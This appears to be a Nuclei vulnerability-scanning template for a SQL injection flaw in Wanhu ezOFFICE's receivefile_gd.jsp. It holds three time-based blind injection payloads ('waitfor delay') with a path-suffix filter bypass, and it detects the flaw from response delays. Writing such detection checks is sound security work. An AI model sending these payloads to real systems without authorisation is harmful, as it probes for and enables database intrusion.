id: wanhuOA-receivefilegd-sqli
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 万户ezOFFICE协同管理平台receivefile_gd.jsp存在SQL注入漏洞，攻击者可获取数据库敏感信息
  reference:
    - https://mp.weixin.qq.com/s/Oy5iPqfBXAh46tjHZFSg8w
  tags: tags
http:
  - method: GET
    path:
      - "{{BaseURL}}/defaultroot/modules/govoffice/gov_documentmanager/receivefile_gd.jsp;.js?recordId=221;waitfor+delay+'0:0:3'--+-"
      - "{{BaseURL}}/defaultroot/modules/govoffice/gov_documentmanager/receivefile_gd.jsp;.js?recordId=221;waitfor+delay+'0:0:6'--+-"
      - "{{BaseURL}}/defaultroot/modules/govoffice/gov_documentmanager/receivefile_gd.jsp;.js?recordId=221;waitfor+delay+'0:0:9'--+-"

    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"